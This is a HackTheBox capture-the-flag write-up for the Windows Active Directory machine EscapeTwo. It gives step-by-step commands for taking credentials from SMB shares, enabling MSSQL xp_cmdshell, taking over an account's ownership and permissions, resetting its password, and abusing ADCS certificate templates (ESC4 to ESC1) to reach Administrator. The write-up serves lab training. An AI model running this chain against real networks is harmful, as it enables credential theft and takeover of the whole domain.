# EscapeTwo — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.232.128 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/escapetwo) |

**Techniques:** SMB enumeration -> MSSQL (xp_cmdshell) -> credential harvest -> ADCS ESC4 -> ESC1 -> Administrator

**Starting credentials:** `rose : KxEPkKe6R8su`

---

## Summary

Windows AD machine centered around ADCS abuse. Path goes through SMB enumeration, MSSQL credential harvesting, and privilege escalation via an ESC4 to ESC1 attack chain to obtain a certificate as Administrator.

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -oA scans/escapeTwo 10.129.232.128
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      <- unusual on DC
5985/tcp open  wsman
```

MSSQL on 1433 is uncommon on DCs — credentials stored somewhere nearby.

---

## 02 — Foothold — SMB to MSSQL

```bash
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
# SHARE: Accounting Department  READ

smbclient '//10.129.232.128/Accounting Department' -U 'rose%KxEPkKe6R8su'
smb: \> get accounts.xlsx
smb: \> get corporate.xlsx
# Spreadsheets contain sa credentials: REGGIE1234ronnie
```

```bash
impacket-mssqlclient sequel.htb/sa:'REGGIE1234ronnie'@10.129.232.128

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
# sequel\sql_svc
```

Enumerate config files and registry via xp_cmdshell -> surface `ryan : WqSZAF6CysDQbGb3`

---

## 03 — Lateral Movement

```bash
evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
type C:\Users\ryan\Desktop\user.txt
```

**User flag obtained.**

---

## 04 — PrivEsc — ADCS ESC4 to ESC1

```bash
certipy-ad find -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' \
  -dc-ip 10.129.232.128 -vulnerable -stdout
# Template: DunderMifflinAuthentication
# ESC4: ryan has write permissions on template object
```

ESC4 is the primitive that enables ESC1. Chain: write template -> request cert -> authenticate.

**Step 1 — Take control of ca_svc** (has enrollment rights on template):

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' \
  'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' \
  -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

net rpc password "ca_svc" "NewPass123!" \
  -U "sequel.htb/ryan%WqSZAF6CysDQbGb3" -S 10.129.232.128
```

**Step 2 — Modify template to enable ESC1:**

```bash
certipy-ad template -u 'ca_svc@sequel.htb' -p 'NewPass123!' \
  -template DunderMifflinAuthentication -save-old
```

**Step 3 — Request cert as Administrator:**

```bash
certipy-ad req -u 'ca_svc@sequel.htb' -p 'NewPass123!' \
  -dc-ip 10.129.232.128 -ca sequel-DC-CA \
  -template DunderMifflinAuthentication \
  -upn Administrator@sequel.htb -out admin
```

**Step 4 — Authenticate:**

```bash
certipy-ad auth -pfx admin.pfx -username Administrator \
  -domain sequel.htb -dc-ip 10.129.232.128

evil-winrm -i 10.129.232.128 -u Administrator -H <NT_HASH>
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag obtained.**

---

## Key takeaways

- ESC4 (write on template) is the primitive that enables ESC1 — certipy reports them separately but the exploit chain combines both
- MSSQL on a DC almost always means credentials are stored in SMB shares nearby
- `xp_cmdshell` enumeration of config files is fast for finding lateral movement creds
